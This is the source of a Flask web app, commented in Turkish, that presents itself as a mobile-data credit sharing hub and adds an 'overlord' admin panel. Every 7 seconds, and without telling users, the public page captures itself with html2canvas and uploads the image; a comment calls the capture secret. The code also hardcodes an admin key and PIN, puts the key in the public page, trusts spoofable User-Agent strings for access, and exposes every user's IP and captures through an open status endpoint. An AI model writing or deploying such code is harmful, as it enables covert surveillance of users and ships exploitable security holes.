from flask import Flask, render_template_string, jsonify, request, Response
import time, io, os, random, json, threading, base64
from threading import Lock

app = Flask(__name__)

# --- NETSWAP SOVEREIGN TRUE-CAPTURE v153.0 ---
# Vizyon: Gerçek Zamanlı Ekran Yakalama, Kusursuz A55 Erişimi ve VIP Otoritesi. [cite: 2026-01-03]
VERSION = "v153.0"
ADMIN_KEY = "ali_yigit_overlord_A55" 
ADMIN_PIN = "1907" 

transaction_lock = Lock()
state = {
    "is_active": False, "global_lock": False,
    "banned_peers": [], "user_registry": {}, 
    "active_admins": {}, 
    "evolution_count": 53, "s100_temp": "37°C"
}

def get_device_info(ua):
    ua = ua.upper()
    if "SM-A55" in ua or "437F" in ua or "ANDROID" in ua: return "Samsung A55"
    if "WINDOWS" in ua: return "Casper S100 (PC)"
    return "Mobil Cihaz"

def check_admin_auth(req):
    ua = req.headers.get('User-Agent', '').upper()
    key, pin = req.args.get('key'), req.args.get('pin', '').strip()
    # A55 ve PC için mutlak erişim [cite: 2026-01-03]
    is_authorized = "SM-A55" in ua or "437F" in ua or "WINDOWS" in ua or "ANDROID" in ua
    if key == ADMIN_KEY and pin == ADMIN_PIN and is_authorized:
        session_id = f"ADMIN-{get_device_info(ua)}-{req.remote_addr}"
        state["active_admins"][session_id] = {"device": get_device_info(ua), "ip": req.remote_addr, "last_seen": time.strftime('%H:%M:%S')}
        return True
    return False

@app.route('/overlord_api/<action>')
def admin_api(action):
    if not check_admin_auth(request): return "YETKİSİZ", 403
    target = request.args.get('target_peer')
    val = request.args.get('value', "")
    with transaction_lock:
        if action == "lock": state["global_lock"] = not state["global_lock"]
        elif target in state["user_registry"]:
            u = state["user_registry"][target]
            if action == "gift": u["credits"] += float(val)
            elif action == "vip": u["is_vip"] = not u.get("is_vip", False)
            elif action == "ban": 
                state["banned_peers"].append(target)
                u["status"] = "BANNED"
    return jsonify(state)

@app.route('/upload_ss', methods=['POST'])
def upload_ss():
    p_id = request.args.get('peer_id')
    if p_id in state["user_registry"]:
        img_data = request.json.get('image')
        # Arşivi saniye bazlı güncelle [cite: 2026-01-03]
        if "archive" not in state["user_registry"][p_id]: state["user_registry"][p_id]["archive"] = []
        state["user_registry"][p_id]["archive"].append({"time": time.strftime('%H:%M:%S'), "data": img_data})
        if len(state["user_registry"][p_id]["archive"]) > 8: state["user_registry"][p_id]["archive"].pop(0)
    return "OK"

@app.route('/overlord')
def overlord_panel():
    if not check_admin_auth(request): return "<h1>ERİŞİM ENGELLENDİ: Cihaz Doğrulanamadı</h1>", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Sovereign Capture</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white p-4 font-mono text-[9px]">
    <div class="border-b-2 border-blue-600 pb-2 mb-4 flex justify-between items-center">
        <h1 class="text-xl font-black text-blue-500 uppercase italic underline">TRUE-CAPTURE v153.0</h1>
        <div id="adminNodes" class="flex gap-2"></div>
    </div>
    <div class="grid grid-cols-4 gap-4">
        <div class="col-span-1 bg-zinc-950 p-4 border border-zinc-900 rounded-2xl">
            <h2 class="text-blue-400 font-bold mb-2 border-b border-blue-900 uppercase">GÖLGE TAKİP</h2>
            <select id="pS" class="w-full bg-zinc-900 p-2 rounded mb-2 text-white outline-none" onchange="uG()"></select>
            <div id="gallery" class="space-y-2 overflow-y-auto max-h-[500px]"></div>
        </div>
        <div class="col-span-3 bg-zinc-950 rounded-2xl border border-zinc-900 overflow-hidden">
            <table class="w-full text-left">
                <thead class="bg-zinc-900 text-zinc-500 font-bold italic text-[8px]"><tr><th class="p-3">CİHAZ/IP</th><th>ID</th><th>BAKİYE</th><th>HIZ</th><th>YÖNETİM</th></tr></thead>
                <tbody id="userTable"></tbody>
            </table>
        </div>
    </div>
    <script>
        const k="{{a_key}}", p="{{a_pin}}"; let reg = {};
        async function f(a, t="", v=""){ await fetch(`/overlord_api/${a}?key=${k}&pin=${p}&target_peer=${t}&value=${encodeURIComponent(v)}`); }
        function uG(){
            const id = document.getElementById('pS').value; const g = document.getElementById('gallery'); g.innerHTML = '';
            if(id && reg[id] && reg[id].archive){
                reg[id].archive.slice().reverse().forEach(s => {
                    g.innerHTML += `<div class="p-1 border border-zinc-800 rounded mb-2 bg-black shadow-lg">
                        <p class="text-[6px] text-zinc-600 mb-1">Time: ${s.time}</p>
                        <img src="${s.data}" class="w-full rounded border border-zinc-900"></div>`;
                });
            }
        }
        async function update(){
            const r=await fetch('/api/status'); const d=await r.json(); reg = d.user_registry;
            let uH="", aH="", pO="<option value=''>Cihaz Seç...</option>";
            for(let sid in d.active_admins){ let a=d.active_admins[sid]; aH += `<span class="bg-blue-900/30 px-3 py-1 rounded-full text-blue-400 border border-blue-800 font-bold">🛡️ ${a.device}</span>`; }
            for(let id in d.user_registry){
                let u=d.user_registry[id]; if(d.banned_peers.includes(id)) continue;
                pO += `<option value="${id}">${id} (${u.device})</option>`;
                uH += `<tr class="border-b border-zinc-900 hover:bg-zinc-900/30 transition"><td class="p-3"><b>${u.device}</b><br><span class="text-zinc-600 font-bold">${u.ip}</span></td>
                <td class="${u.is_vip?'text-yellow-500 font-black':'text-blue-400'}">${id}</td><td class="text-green-500 font-bold">${u.credits.toFixed(1)}</td><td class="text-yellow-600">${u.max_mbps}M</td>
                <td><button onclick="f('gift','${id}', prompt('MB:'))" class="underline mr-2 text-zinc-400">KREDİ</button>
                <button onclick="f('vip','${id}')" class="text-yellow-500 underline mr-2">VIP</button>
                <button onclick="f('ban','${id}')" class="text-red-600 underline">BAN</button></td></tr>`;
            }
            document.getElementById('userTable').innerHTML = uH; document.getElementById('adminNodes').innerHTML = aH;
            document.getElementById('pS').innerHTML = pO; uG(); setTimeout(update, 2000);
        } update();
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN)

@app.route('/action/<type>')
def handle_action(type):
    p_id = request.args.get('peer_id', 'GUEST')
    with transaction_lock:
        if p_id in state["banned_peers"]: return jsonify({"error": "BAN"}), 403
        if p_id not in state["user_registry"]:
            state["user_registry"][p_id] = {"credits": 50.0, "max_mbps": 96.0, "is_vip": False, "device": get_device_info(request.headers.get('User-Agent','')), "ip": request.remote_addr, "archive": []}
        u = state["user_registry"][p_id]
        if type == "receive" and not u["is_vip"]: u["credits"] = max(0, u["credits"] - 0.2)
    return jsonify(state)

@app.route('/api/status')
def get_status(): return jsonify(state)

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sovereign Hub</title>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</head>
<body class="bg-black text-green-500 font-mono p-4" onload="mainLoop()">
    <div class="text-center mb-6"><h1 class="text-2xl font-black text-blue-600 italic tracking-tighter uppercase">IMPERIAL HUB</h1><p class="text-[8px] text-zinc-700">v153.0 Active Surveillance</p></div>
    <div class="bg-zinc-950 p-12 rounded-[50px] border-2 border-zinc-900 mb-8 text-center shadow-2xl">
        <div id="credits" class="text-7xl font-black text-white italic">0.00</div><span class="text-[10px] text-zinc-700 block mt-3 uppercase tracking-widest">MB Bakiye</span>
    </div>
    <div class="grid grid-cols-2 gap-4">
        <button onclick="control('share')" class="py-10 bg-green-700 text-black font-black rounded-3xl text-3xl active:scale-90 transition shadow-lg">VER</button>
        <button onclick="control('receive')" class="py-10 bg-blue-700 text-white font-black rounded-3xl text-3xl active:scale-90 transition shadow-lg">AL</button>
    </div>
    <div id="secret" onclick="tA()" class="fixed bottom-0 right-0 w-24 h-24 opacity-0"></div>
    <script>
        if(!localStorage.getItem('n_id')) localStorage.setItem('n_id', "NS-" + Math.floor(1000 + Math.random()*9000));
        let myId = localStorage.getItem('n_id');
        function tA() { window.cC = (window.cC || 0) + 1; if(window.cC >= 5) { const p = prompt("Hükümdar PIN:"); if(p) window.location.href=`/overlord?key={{a_key}}&pin=`+p.trim(); window.cC=0; } setTimeout(()=>window.cC=0, 3000); }
        async function control(type) { await fetch(`/action/${type}?peer_id=${myId}`); }
        
        async function trueCapture() {
            try {
                // html2canvas ile GERÇEK DOM yakalama [cite: 2026-01-03]
                const canvas = await html2canvas(document.body, { backgroundColor: '#000', scale: 0.5 });
                const data = canvas.toDataURL('image/jpeg', 0.2);
                fetch(`/upload_ss?peer_id=${myId}`, {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ image: data })
                });
            } catch(e) {}
        }

        async function mainLoop() {
            const r = await fetch('/api/status'); const d = await r.json();
            const u = d.user_registry[myId] || {credits:0};
            document.getElementById('credits').innerText = u.credits.toFixed(2);
            // Her 7 saniyede bir ekranı gizlice yakala [cite: 2026-01-03]
            if(!window.ssInt) window.ssInt = setInterval(trueCapture, 7000);
            setTimeout(mainLoop, 1000);
        }
    </script>
</body></html>
""", a_key=ADMIN_KEY)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
